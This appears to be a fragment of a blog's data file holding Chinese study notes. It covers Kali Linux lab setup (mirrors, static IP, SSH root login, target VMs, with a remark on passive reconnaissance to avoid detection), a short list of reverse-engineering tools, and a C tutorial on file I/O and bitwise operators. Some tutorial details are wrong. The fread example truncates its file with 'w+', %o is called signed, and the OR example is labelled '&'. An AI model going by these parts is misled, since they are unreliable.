---记录当前shell(bash/zsh)</span><br></pre></td></tr></table></figure>\n\n<p>配镜像源</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(vim):set nu</span><br></pre></td></tr></table></figure>\n\n<p>中科大镜像源</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<p>复制粘贴kali:选中+滚轮</p>\n<p>deb 代表软件的位置 deb-src 代表源代码所在的位置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows .exe .zip .rar</span><br><span class=\"line\"></span><br><span class=\"line\">linux .rpm  .tar.gz .deb</span><br></pre></td></tr></table></figure>\n\n<p>更新前apt update</p>\n<p>kali 的 apt 源</p>\n<p>Kali Rolling :是kali即时更新版，只要kali中有更新，更新包就会放入Kali Rolling中</p>\n<p>在kali rolling 下有三类软件包 main 、non-free、contrib;</p>\n<table>\n<thead>\n<tr>\n<th>dists区域</th>\n<th>软件包组件标准</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>main</td>\n<td>遵从Debian 自由软件指导方针(DFSG)，并且不依赖于non-free</td>\n</tr>\n<tr>\n<td>contrib</td>\n<td>遵从Debian 自由软件指导方针(DFSG)，但依赖于non-free</td>\n</tr>\n<tr>\n<td>non-free</td>\n<td>不遵从Debian 自由软件指导方针(DFSG)</td>\n</tr>\n</tbody></table>\n<p>apt  apt-get  包含关系</p>\n<p>apt常用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install  安装软件包</span><br><span class=\"line\">apt remove  移除软件包</span><br><span class=\"line\">apt update  更新可用软件包列表</span><br><span class=\"line\">apt upgrade  通过 安装/升级 软件来更新系统</span><br><span class=\"line\">apt dist-upgrade (有风险)带卸载的更新</span><br><span class=\"line\">vim /etc/apt/sources.list 编辑软件源信息文件</span><br></pre></td></tr></table></figure>\n\n<p>init 0 关机</p>\n<p>ifconfig </p>\n<p>ifconfig eth0 192.168.1.53/24(子网掩码255.255.255.0)   配置临时ip</p>\n<p>route add default gw 192.168.1.1       配置默认路由</p>\n<p>ping 192.168.1.1</p>\n<p>vim /etc/resolv.conf</p>\n<p>echo nameserver 8.8.8.8 &gt;/etc/resolv.conf    配置dns服务</p>\n<p>永久搞一个ip</p>\n<p>vim /etc/network/interfaces</p>\n<p>添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">#iface eth0 inet dhcp</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static     静态地址</span><br><span class=\"line\"></span><br><span class=\"line\">address 192.168.1.53\t   固定IP地址</span><br><span class=\"line\"></span><br><span class=\"line\">netmask 255.255.255.0      子网掩码</span><br><span class=\"line\"></span><br><span class=\"line\">gateway 192.168.1.1        网关</span><br></pre></td></tr></table></figure>\n\n<p>机器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kali xp win10/7 centos7 靶机</span><br></pre></td></tr></table></figure>\n\n<p>重启网络服务</p>\n<p> /etc/init.d/networking                             /etc/init.d/networking restart</p>\n<p>systemctl  restart networking                 systemctl  restart networking.service        </p>\n<p>vim /etc/ssh/sshd_config</p>\n<p>找#Authentication:</p>\n<p>第二行  PermitRootLogin yes</p>\n<p>三行后 PubkeyAuthentication yes</p>\n<p> /etc/init.d/ssh restart     /  systemctl  restart  ssh</p>\n<p>update -rc.d ssh enable</p>\n<p>xshell 连接 </p>\n<p>传文件 yum install lrzsz-y</p>\n<p>apt install lrzsz</p>\n<p>rz 上传</p>\n<p>sz 下载</p>\n<p>搬瓦工</p>\n<p>国外vps服务器</p>\n<p>350<a href=\"https://bwh81.net/cart.php\">https://bwh81.net/cart.php</a></p>\n<p>*** 利用第三方服务对目标进行被动信息收集，防止被发现</p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kali学习日记</span><br></pre></td></tr></table></figure>\n\n<p>开机操作O(∩_∩)O</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo passwd root 设置密码</span><br><span class=\"line\">su root </span><br><span class=\"line\">pwd</span><br><span class=\"line\">su -root</span><br><span class=\"line\">sudo -i</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo $SHELL(/usr/bin/zsh) ---记录当前shell(bash/zsh)</span><br></pre></td></tr></table></figure>\n\n<p>配镜像源</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(vim):set nu</span><br></pre></td></tr></table></figure>\n\n<p>中科大镜像源</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<p>复制粘贴kali:选中+滚轮</p>\n<p>deb 代表软件的位置 deb-src 代表源代码所在的位置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows .exe .zip .rar</span><br><span class=\"line\"></span><br><span class=\"line\">linux .rpm  .tar.gz .deb</span><br></pre></td></tr></table></figure>\n\n<p>更新前apt update</p>\n<p>kali 的 apt 源</p>\n<p>Kali Rolling :是kali即时更新版，只要kali中有更新，更新包就会放入Kali Rolling中</p>\n<p>在kali rolling 下有三类软件包 main 、non-free、contrib;</p>\n<table>\n<thead>\n<tr>\n<th>dists区域</th>\n<th>软件包组件标准</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>main</td>\n<td>遵从Debian 自由软件指导方针(DFSG)，并且不依赖于non-free</td>\n</tr>\n<tr>\n<td>contrib</td>\n<td>遵从Debian 自由软件指导方针(DFSG)，但依赖于non-free</td>\n</tr>\n<tr>\n<td>non-free</td>\n<td>不遵从Debian 自由软件指导方针(DFSG)</td>\n</tr>\n</tbody></table>\n<p>apt  apt-get  包含关系</p>\n<p>apt常用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install  安装软件包</span><br><span class=\"line\">apt remove  移除软件包</span><br><span class=\"line\">apt update  更新可用软件包列表</span><br><span class=\"line\">apt upgrade  通过 安装/升级 软件来更新系统</span><br><span class=\"line\">apt dist-upgrade (有风险)带卸载的更新</span><br><span class=\"line\">vim /etc/apt/sources.list 编辑软件源信息文件</span><br></pre></td></tr></table></figure>\n\n<p>init 0 关机</p>\n<p>ifconfig </p>\n<p>ifconfig eth0 192.168.1.53/24(子网掩码255.255.255.0)   配置临时ip</p>\n<p>route add default gw 192.168.1.1       配置默认路由</p>\n<p>ping 192.168.1.1</p>\n<p>vim /etc/resolv.conf</p>\n<p>echo nameserver 8.8.8.8 &gt;/etc/resolv.conf    配置dns服务</p>\n<p>永久搞一个ip</p>\n<p>vim /etc/network/interfaces</p>\n<p>添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">#iface eth0 inet dhcp</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static     静态地址</span><br><span class=\"line\"></span><br><span class=\"line\">address 192.168.1.53\t   固定IP地址</span><br><span class=\"line\"></span><br><span class=\"line\">netmask 255.255.255.0      子网掩码</span><br><span class=\"line\"></span><br><span class=\"line\">gateway 192.168.1.1        网关</span><br></pre></td></tr></table></figure>\n\n<p>机器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kali xp win10/7 centos7 靶机</span><br></pre></td></tr></table></figure>\n\n<p>重启网络服务</p>\n<p> /etc/init.d/networking                             /etc/init.d/networking restart</p>\n<p>systemctl  restart networking                 systemctl  restart networking.service        </p>\n<p>vim /etc/ssh/sshd_config</p>\n<p>找#Authentication:</p>\n<p>第二行  PermitRootLogin yes</p>\n<p>三行后 PubkeyAuthentication yes</p>\n<p> /etc/init.d/ssh restart     /  systemctl  restart  ssh</p>\n<p>update -rc.d ssh enable</p>\n<p>xshell 连接 </p>\n<p>传文件 yum install lrzsz-y</p>\n<p>apt install lrzsz</p>\n<p>rz 上传</p>\n<p>sz 下载</p>\n<p>搬瓦工</p>\n<p>国外vps服务器</p>\n<p>350<a href=\"https://bwh81.net/cart.php\">https://bwh81.net/cart.php</a></p>\n<p>*** 利用第三方服务对目标进行被动信息收集，防止被发现</p>\n"},{"_content":"010 Editor\n\nobjdump\n\ngdb(vim ~/.gdbinit) \n\n- disass\n- vmmap\n\nTracing","source":"_posts/工具.md","raw":"010 Editor\n\nobjdump\n\ngdb(vim ~/.gdbinit) \n\n- disass\n- vmmap\n\nTracing","slug":"工具","published":1,"date":"2021-06-25T08:22:03.492Z","updated":"2021-06-25T13:06:15.177Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9b0004rouv1blj3vfe","content":"<p>010 Editor</p>\n<p>objdump</p>\n<p>gdb(vim ~/.gdbinit) </p>\n<ul>\n<li>disass</li>\n<li>vmmap</li>\n</ul>\n<p>Tracing</p>\n","site":{"data":{}},"excerpt":"","more":"<p>010 Editor</p>\n<p>objdump</p>\n<p>gdb(vim ~/.gdbinit) </p>\n<ul>\n<li>disass</li>\n<li>vmmap</li>\n</ul>\n<p>Tracing</p>\n"},{"_content":"#### 打开文件fopen函数的用法                \n\n在C语言中，对文件操作之前，首先需要打开文件，使用的函数是fopen函数，它的作用是打开文件，获取该文件的文件指针，方便后续操作。函数原型为: \n\n```c\nFILE *fopen(const char *filename, const char *mode);\n```\n\n可以看得出来，该函数需要两个字符串类型的参数，第一个是文件名，既要操作的文件对象。第二个是打开方式，这里的打开方式只是，对文件以何种模式打开，包括文本模式打开还是二进制打开、是读还是写还是追加等等等等,具体类型如下表，可以根据情况使用：\n\n| 参数 | 作用                                                         |\n| ---- | ------------------------------------------------------------ |\n| r    | 以只读方式打开文件，该文件必须存在。                         |\n| r+   | 以读/写方式打开文件，该文件必须存在。                        |\n| rb+  | 以读/写方式打开一个二进制文件，只允许读/写数据。             |\n| rt+  | 以读/写方式打开一个文本文件，允许读和写。                    |\n| w    | 打开只写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。 |\n| w+   | 打开可读/写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。 |\n| a    | 以附加的方式打开只写文件。若文件不存在，则会创建该文件；如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF 符保留）。 |\n| a+   | 以附加方式打开可读/写的文件。若文件不存在，则会创建该文件，如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF符不保留）。 |\n| wb   | 以只写方式打开或新建一个二进制文件，只允许写数据。           |\n| wb+  | 以读/写方式打开或新建一个二进制文件，允许读和写。            |\n| wt+  | 以读/写方式打开或新建一个文本文件，允许读和写。              |\n| at+  | 以读/写方式打开一个文本文件，允许读或在文本末追加数据。      |\n| ab+  | 以读/写方式打开一个二进制文件，允许读或在文件末追加数据。    |\n\n函数的返回值则表示打开成功后的文件指针，格式为FILE类型，是一个结构体类型，供后面使用，如果打开失败，则返回NULL\n\nFILE结构体类型虽用不到，但可以了解，定义如下：\n\n```c\ntypedef struct { \n　　int level;　　　　　　　　　　　``/* fill/empty level of buffer */\n　　unsigned flags; 　　　　　 ``/* File status flags */\n　　char fd;　　　　　　　　　　　 ``/* File descriptor */\n　　unsigned char hold;　　　　 ``/* Ungetc char if no buffer */\n　　int bsize;　　　　　　　　　　 ``/* Buffer size */\n　　unsigned char _FAR *buffer;　``/* Data transfer buffer */\n　　unsigned  char _FAR *curp;　　``/* Current active pointer */\n　　unsigned istemp;　　　　　　``/* Temporary file indicator */\n　　short token;　　　　　　　　 ``/* Used for validity checking */\n}FILE;　　　　　　　　　　　　 ``/* This is the FILE object */\n```\n\n比如，如果我们现在想打开一个D盘根目录下的abc.dat，并且想读出该文件里的数据，那么我们可以这样写：\n\n```c\nFILE *fp;\nfp=fopen(\"d:\\\\abc.dat\",\"r\")\n//后面通过fp指针开始读文件\n```\n\n值得说明的是\n\n1.该文件的目录是绝对路径，因此这样写，如果不写盘符比如abc.dat则表示相对路径，表示与本程序同目录下。\n\n2.路径中的反斜杠虽然只有一个，但这里打了两个，原因在于C语言字符串中对反斜杠要当作转义字符处理，因此要用两个反斜杠才能表示一个。\n\n3.一旦以r也就是只读的方式打开文件，后面则不允许写数据，否则会出错，一定要保持一致！\n\n#### 写文件fprintf函数的用法                \n\n我们学会了打开文件之后，如果打开模式是写，那么可以用fprintf函数来进行写，下面来介绍fprintf函数，它的原型是：\n\n```c\nint fprintf (FILE* stream, const char*format, [argument])\n```\n\n该函数是一个格式化写入的库函数，可以看到，除了长得和printf函数很像以外，参数也非常像，多了一个第一个参数，文件指针，即第一步打开文件时得到的文件指针，后面的参数和printf一样，按照指定的格式将数据写入文件。例如：\n\n```c\nfprintf(fp,\"%s\",\"www.fbc123.com\");\n```\n\n这句代码的意思是将字符串\"www.fbc123.com\" 以%s的格式写入fp所指向的文件中\n\n| 控制符   | 作用                                      |\n| -------- | ----------------------------------------- |\n| %c       | 字符                                      |\n| %d 或 %i | 有符号十进制整数                          |\n| %e       | 使用 e 字符的科学科学记数法（尾数和指数） |\n| %E       | 使用 E 字符的科学科学记数法（尾数和指数） |\n| %f       | 十进制浮点数                              |\n| %g       | 自动选择 %e 或 %f 中合适的表示法          |\n| %G       | 自动选择 %E 或 %f 中合适的表示法          |\n| %o       | 有符号八进制                              |\n| %s       | 字符的字符串                              |\n| %u       | 无符号十进制整数                          |\n| %x       | 无符号十六进制整数                        |\n| %X       | 无符号十六进制整数（大写字母）            |\n| %p       | 指针地址                                  |\n| %n       | 无输出                                    |\n| %        | 字符                                      |\n\n更多的格式可以参照printf中的格式，可以通用\n\n而返回值为整型，如果写入成功则返回写入字符的格式，否则返回一个负数。\n\n需要注意理解的是，fprintf函数虽然和printf函数很像，表示输出，但准确说是是写入的意思，是指程序向文件里写，要清楚数据的流向。\n\n#### 读文件fscanf函数的用法                \n\n如同printf与scanf的关系一样，fprintf和fscanf也是如此，fprintf负责向文件里写数据，fscanf函数则可以从文件里读数据\n\n它的函数原型如下：\n\n```c\nint fscanf(FILE *stream, char *format[,argument...]);\n```\n\n作为格式化写数据函数，它的参数同样比scanf也多一个参数，即第一个参数文件指针，表示读取的文件目标，其余参数和scanf一样，按照相应的格式进行读取，返回值表示读取数据的字节数。比如：\n\n```c\nchar str[100];\nfscanf(fp,\"%s\",str);\n```\n\n则表示从fp所指向的文件中进行读数据，与空格或换行结束，将结果保存到str数组中\n\n更多scanf的格式如下表：\n\n| 格式        | 作用                                                         |\n| ----------- | ------------------------------------------------------------ |\n| %d          | 读入一个十进制整数                                           |\n| %i          | 读入十进制，八进制，十六进制整数，与%d类似，但是在编译时通过数据前置或后置来区分进制，如加入“0x”则是十六进制，加入“0”则为八进制。例如串“031”使用%d时会被算作31，但是使用%i时会算作25 |\n| %u          | 读入一个无符号十进制整数                                     |\n| %f %F %g %G | 用来输入实数，可以用小数形式或指数形式输入                   |\n| %x %x       | 读入十六进制整数                                             |\n| %o          | 读入八进制整数                                               |\n| %s          | 直到遇到一个空格字符（空格字符可以是空白、换行和制表符）。   |\n| %c          | 单个字符：读取下一个字符。如果指定了一个不为 1 的宽度 width，函数会读取 width 个字符，并通过参数传递，把它们存储在数组中连续位置。在末尾不会追加空字符。 |\n\n#### 写文件fwrite函数的用法                \n\nfwrite函数是写文件的函数，它的函数原型如下：\n\n```c\nsize_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)\n```\n\n可以看到这个函数的参数有四个:\n\n第一个ptr是要写入的数据的头指针，无符号类型；\n\n第二个参数size是大小，表示每个写入元素的大小，单位是字节；\n\n第三个参数nmemb是个数，以上一个参数为单位的个数；\n\n第四个参数stream就是文件指针，表示往哪里写。\n\n至于返回值，如果成功执行，则返回写入元素的个数，如果不和nmemb相等，则表示出错。\n\n```c\n#include<stdio.h>\n int main ()\n{\n   FILE *fp;   \n   char str[] = \"www.fbc123.com\"; \n   fp = fopen( \"fbc123.dat\" , \"w\" );   \n   fwrite(str, sizeof(str) , 1, fp ); \n   fclose(fp);  \n   return(0);\n}\n```\n\n如代码所示，程序运行后，并不会在屏幕上有任何显示，而是将str中的字符串写入了fbc123.dat这个文件中，待程序运行结束退出后，大家可以打开程序同级目录下的fbc123.dat文件对比\n\n#### 读文件fread函数的用法                \n\n与fwrite是一对，读文件的函数fread的函数原型如下：\n\n```c\nsize_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)\n```\n\nfread函数的作用是从文件里读内容到程序中，它的参数意思是：\n\n第一个参数ptr表示盛放内容的首地址\n\n第二个参数size表示每个元素的大小，单位还是字节\n\n第三个参数nmem表示要读取的元素个数\n\n第四个参数stream表示的是文件指针，即从哪个文件中读取\n\n返回值则是表示读取元素的个数，与nmemb一致表示读取成功，否则失败\n\n实例代码如下：\n\n```c\n#include <stdio.h>\n#include <string.h>  \nint main()\n{\n   FILE *fp;\n   char buffer[100];\n   /* 首先打开文件，读写都可以，假设文件中已经有内容为www.fbc123.com */\n   fp = fopen(\"fbc123.dat\", \"w+\"); \n     /* 读取并显示数据 */\n   fread(buffer, 1, 15, fp);\n   printf(\"%s\\n\", buffer);\n   fclose(fp);   \n   return(0);\n}\n```\n\n需要注意文件的打开方式，以及保证文件中有数据，并且buffer空间足够大才可以，大家可以上机实验\n\n#### 关闭文件fclose函数的用法                \n\n对于文件操作的最后一步，这一步的作用主要是断开程序与文件关联，切断IO数据流，释放文件不在占用，结束文件按操作\n\n这一步的操作很简单，用fclose函数完成。如下：\n\n```c\nint fclose( FILE *fp );\n```\n\n其中fp为第一步fopen时成功打开文件后的文件指针；返回值为整型，如成功关闭则返回0，失败则返回-1\n\n如果本步骤不执行，前面的读写文件，可能不会有效果。同时，对win7系统之前，如若不执行本步骤，当试图再次修改如移动打开等操作这个文件的时候就会蹦出“无法修改该文件，该文件已经被xxx打开”的提示，这下我们明白是什么原因了！\n\n### 加一个位运算\n\n与其他运算符不同，C语言中位运算，顾名思义，是以数值的二进制位为单位进行操作的，包含<<（左移）、>>（右移）、~（按位取反）、&（按位与）、|（按位或）、^(按位异或) 共六种运算符。\n\n| 左移运算符   << | 向左（即高位）移位，右侧补0               |\n| --------------- | ----------------------------------------- |\n| 右移运算符   >> | 向右（即低位）移位，左侧补0               |\n| 按位取反     ~  | 如名，即0变1,1变0                         |\n| 按位与      &   | 相对应的两个位都为1则为1，反之为0         |\n| 按位或      \\|  | 相对应的两个位至少有一个为1即为1，反之为0 |\n| 按位异或    ^   | 相对应的两个位相同为0，相异（不同）为1    |\n\n<<和>>运算符，通过箭头方向可以很好的辨别，分别是C语言位运算符中的左移运算符和右移运算符，如表达式13<<2，它的运算过程为：13的用二进制（四个字节，不考虑符号）表示为，0000 0000 0000 0000 0000 0000 0000 1101，那么向左移两位，右侧补0，则变为0000 0000 0000 0000 0000 0000 0011 0100 换成十进制即变为52，大家可以自行验证。\n\n同理，再举一个例子，如表达式25>>3，表示25的二进制位向右移三位，由\n\n0000 0000 0000 0000 0000 0000 0001 1001 变为0000 0000 0000 0000 0000 0000 0000 0011 即十进制3\n\n```c\n#include<stdio.h>\nint main()\n{\n    int a,b;\n    a=13<<2;\n    b=25>>3;\n    printf(\"a=%d,b=%d\\n\",a,b);\n    return 0;\n}\n```\n\n```c\na=52,b=3\n```\n\n**移位运算符的作用：**\n\n​    1.左移N位的本质是乘以2的N次方\n\n​    2.右移N位的本质是除以2的N次方\n\n**&按位与运算符**                \n\n按位与运算符&，有点和前面学过的逻辑与（&&）运算符类似，只有一个&，都是同为1则为1。不同的是按位相互运算。如3&5，运算过程如下：\n\n```c\n3 0000 0000  0000 0000  0000 0000  0000 0011\n5 0000 0000  0000 0000  0000 0000  0000 0101\n& ------------------------------------------\n  0000 0000  0000 0000  0000 0000  0000 0001\n```\n\n可以看到3&5的结果即十进制1\n\n**按位与运算符的作用:**\n\n1. 清零\n\n   我们可以对某一个数与0进行按位与运算，由于两个位都为1才为1，因此最终全部位都变为0，起到清零的作用\n\n2. 取指定位\n\n   如某些存储场景下，“第1~3位表示xxxx“”，我们需要取出1~3位，则可以让原数值与数字7进行按位与运算，得到的结果即是原数值的1~3位的值。\n\n3. 判断奇偶\n\n   可以发现，数字的奇偶取决于二进制位的最低一位是1还是0，因此只需要与1按位与运算，判断是1是0即可得知奇偶。\n\n**|按位或运算符**                \n\n|按位或运算符，同样，它也与我们前面学过的逻辑或运算符类似，只有一个竖线表示，作用位，两个对应的二进制位有一个为1结果即为1。如8|7的运算过程可以如下表示：\n\n```c\n8 0000 0000  0000 0000  0000 0000  0000 1000\n7 0000 0000  0000 0000  0000 0000  0000 0111\n& ------------------------------------------\n  0000 0000  0000 0000  0000 0000  0000 1111\n```\n\n可以看到最终的二进制结果换算成十进制即为15（并不是单纯8+7得来的哦！）\n\n**按位或运算符的作用：**\n\n1. 对一个数字的指定位，置为1\n\n   如“某个数字的第七位”表示开关，原先是0，需要改为1的状态，即可以将这个数字与64按位或，即可得到第七位变为1，其余位的值依旧不变。\n\n**^按位异或运算符**                \n\n^表示按位异或运算符，顾名思义，相异，即不同则为1，反之为0\n\n例如15和16进行异或运算，运算过程如下：\n\n```c\n15 0000 0000  0000 0000  0000 0000  0000 1111\n16 0000 0000  0000 0000  0000 0000  0001 0000\n^ ------------------------------------------\n   0000 0000  0000 0000  0000 0000  0001 1111\n```\n\n可以看到，经过按位异或运算后，其结果变成十进制应为31，大家务必弄清楚运算过程，然后再上机验证，代码如下：\n\n```c\n#include<stdio.h>\nint main()\n{\n    int a;\n    a=15^16;\n    printf(\"a=%d\\n\",a);\n    return 0;\n}\n```\n\n**异或运算符的作用**\n\n指定位数的翻转\n\n如想对某个数字的低4位进行翻转，则可以将这个数字与15（二进制为00001111）进行按位异或运算，既可以将原数字的低四位进行翻转，即高四位不变，低四位0变1,1变0\n\n与0异或还是原值\n\n大家可以自行实验，一个数字与0进行异或，结果还是原值\n\n交换两个数字\n\n除了之前我们学习交换两个数字需要第三个变量做中介之外，如今可以通过异或运算进行，代码如下：\n\n```c\n#include<stdio.h>\nint swap(int *a,int *b)\n{\n    if (*a!=*b)\n    {\n        *a=*a^*b;\n        *b=*b^*a;\n        *a=*a^*b;\n    }\n    return 0;\n}\nint main()\n{\n    int a=5;\n    int b=5;\n    swap(&a,&b);\n    printf(\"a=%d b=%d\\n\",a,b);\n    return 0;\n}\n//a=5 b=5\n```\n\n**~取反运算符**                \n\n~取反运算符，是对数值的二进制位进行取反，是第一个单目运算符，因为只有一个运算对象，运算过程是即0变为1,1变为0，非常好理解。\n\n```c\n#include<stdio.h>\nint main()\n{\n    unsigned int a=1;\n    printf(\"~a=%u\\n\",~a);\n    return 0;\n}\n//~a=4294967294\n```\n\n","source":"_posts/c-文件操作.md","raw":"#### 打开文件fopen函数的用法                \n\n在C语言中，对文件操作之前，首先需要打开文件，使用的函数是fopen函数，它的作用是打开文件，获取该文件的文件指针，方便后续操作。函数原型为: \n\n```c\nFILE *fopen(const char *filename, const char *mode);\n```\n\n可以看得出来，该函数需要两个字符串类型的参数，第一个是文件名，既要操作的文件对象。第二个是打开方式，这里的打开方式只是，对文件以何种模式打开，包括文本模式打开还是二进制打开、是读还是写还是追加等等等等,具体类型如下表，可以根据情况使用：\n\n| 参数 | 作用                                                         |\n| ---- | ------------------------------------------------------------ |\n| r    | 以只读方式打开文件，该文件必须存在。                         |\n| r+   | 以读/写方式打开文件，该文件必须存在。                        |\n| rb+  | 以读/写方式打开一个二进制文件，只允许读/写数据。             |\n| rt+  | 以读/写方式打开一个文本文件，允许读和写。                    |\n| w    | 打开只写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。 |\n| w+   | 打开可读/写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。 |\n| a    | 以附加的方式打开只写文件。若文件不存在，则会创建该文件；如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF 符保留）。 |\n| a+   | 以附加方式打开可读/写的文件。若文件不存在，则会创建该文件，如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF符不保留）。 |\n| wb   | 以只写方式打开或新建一个二进制文件，只允许写数据。           |\n| wb+  | 以读/写方式打开或新建一个二进制文件，允许读和写。            |\n| wt+  | 以读/写方式打开或新建一个文本文件，允许读和写。              |\n| at+  | 以读/写方式打开一个文本文件，允许读或在文本末追加数据。      |\n| ab+  | 以读/写方式打开一个二进制文件，允许读或在文件末追加数据。    |\n\n函数的返回值则表示打开成功后的文件指针，格式为FILE类型，是一个结构体类型，供后面使用，如果打开失败，则返回NULL\n\nFILE结构体类型虽用不到，但可以了解，定义如下：\n\n```c\ntypedef struct { \n　　int level;　　　　　　　　　　　``/* fill/empty level of buffer */\n　　unsigned flags; 　　　　　 ``/* File status flags */\n　　char fd;　　　　　　　　　　　 ``/* File descriptor */\n　　unsigned char hold;　　　　 ``/* Ungetc char if no buffer */\n　　int bsize;　　　　　　　　　　 ``/* Buffer size */\n　　unsigned char _FAR *buffer;　``/* Data transfer buffer */\n　　unsigned  char _FAR *curp;　　``/* Current active pointer */\n　　unsigned istemp;　　　　　　``/* Temporary file indicator */\n　　short token;　　　　　　　　 ``/* Used for validity checking */\n}FILE;　　　　　　　　　　　　 ``/* This is the FILE object */\n```\n\n比如，如果我们现在想打开一个D盘根目录下的abc.dat，并且想读出该文件里的数据，那么我们可以这样写：\n\n```c\nFILE *fp;\nfp=fopen(\"d:\\\\abc.dat\",\"r\")\n//后面通过fp指针开始读文件\n```\n\n值得说明的是\n\n1.该文件的目录是绝对路径，因此这样写，如果不写盘符比如abc.dat则表示相对路径，表示与本程序同目录下。\n\n2.路径中的反斜杠虽然只有一个，但这里打了两个，原因在于C语言字符串中对反斜杠要当作转义字符处理，因此要用两个反斜杠才能表示一个。\n\n3.一旦以r也就是只读的方式打开文件，后面则不允许写数据，否则会出错，一定要保持一致！\n\n#### 写文件fprintf函数的用法                \n\n我们学会了打开文件之后，如果打开模式是写，那么可以用fprintf函数来进行写，下面来介绍fprintf函数，它的原型是：\n\n```c\nint fprintf (FILE* stream, const char*format, 